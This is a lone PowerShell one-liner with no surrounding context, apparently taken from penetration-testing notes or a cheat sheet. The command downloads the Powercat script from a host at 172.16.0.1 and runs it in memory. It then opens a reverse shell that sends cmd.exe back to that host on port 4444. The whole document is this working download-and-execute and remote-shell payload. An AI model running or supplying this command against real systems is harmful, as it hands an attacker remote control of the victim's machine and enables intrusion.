powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.0.1/Powercat.ps1');Powercat -c 172.16.0.1 -p 4444 -e cmd"
